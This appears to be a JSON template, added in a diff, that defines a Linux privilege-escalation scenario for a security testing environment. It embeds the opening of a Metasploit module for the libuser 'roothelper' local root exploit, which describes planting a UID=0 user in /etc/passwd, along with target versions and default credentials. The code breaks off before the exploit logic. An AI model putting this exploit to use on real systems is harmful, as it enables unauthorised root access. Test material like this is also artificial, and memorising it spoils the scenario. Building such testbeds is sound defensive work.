@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_44633",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: Libuser - 'roothelper' Local Privilege Escalation (Metasploit) (CVE-2015-3246;CVE-2015-3245)\n\nExploit source code (44633.rb):\n```\n##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = GreatRanking\n\n  include Msf::Post::File\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::System\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Libuser roothelper Privilege Escalation',\n      'Description'    => %q{\n        This module attempts to gain root privileges on Red Hat based Linux\n        systems, including RHEL, Fedora and CentOS, by exploiting a newline\n        injection vulnerability in libuser and userhelper versions prior to\n        0.56.13-8 and version 0.60 before 0.60-7.\n\n        This module makes use of the roothelper.c exploit from Qualys to\n        insert a new user with UID=0 in /etc/passwd.\n\n        Note, the password for the current user is required by userhelper.\n\n        Note, on some systems, such as Fedora 11, the user entry for the\n        current user in /etc/passwd will become corrupted and exploitation\n        will fail.\n\n        This module has been tested successfully on libuser packaged versions\n        0.56.13-4.el6 on CentOS 6.0 (x86_64);\n        0.56.13-5.el6 on CentOS 6.5 (x86_64);\n        0.60-5.el7 on CentOS 7.1-1503 (x86_64);\n        0.56.16-1.fc13 on Fedora 13 (i686);\n        0.59-1.fc19 on Fedora Desktop 19 (x86_64);\n        0.60-3.fc20 on Fedora Desktop 20 (x86_64);\n        0.60-6.fc21 on Fedora Desktop 21 (x86_64);\n        0.60-6.fc22 on Fedora Desktop 22 (x86_64);\n        0.56.13-5.el6 on Red Hat 6.6 (x86_64); and\n        0.60-5.el7 on Red Hat 7.0 (x86_64).\n\n        RHEL 5 is vulnerable, however the installed version of glibc (2.5)\n        is missing various functions required by roothelper.c.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Qualys',       # Discovery and C exploit\n          'Brendan Coles' # Metasploit\n        ],\n      'DisclosureDate' => 'Jul 24 2015',\n      'Platform'       => [ 'linux' ],\n      'Arch'           => [ ARCH_X86, ARCH_X64 ],\n      'SessionTypes'   => [ 'shell', 'meterpreter' ],\n      'Targets'        => [[ 'Auto', {} ]],\n      'Privileged'     => true,\n      'References'     =>\n        [\n          [ 'AKA', 'roothelper.c' ],\n          [ 'EDB', '37706' ],\n          [ 'CVE', '2015-3245' ],\n          [ 'CVE', '2015-3246' ],\n          [ 'BID', '76021' ],\n          [ 'BID', '76022' ],\n          [ 'URL', 'http://seclists.org/oss-sec/2015/q3/185' ],\n          [ 'URL', 'https://access.redhat.com/articles/1537873' ]\n        ],\n      'DefaultTarget'  => 0))\n    register_options [\n      OptEnum.new('COMPILE', [ true, 'Compile on target', 'Auto', %w(Auto True False) ]),\n      OptString.new('PASSWORD', [ true, 'Password for the current user', '' ]),\n      OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp\n```",
+  "cve": "CVE-2015-3246;CVE-2015-3245",
+  "exploitdb_id": "44633",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_44633",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
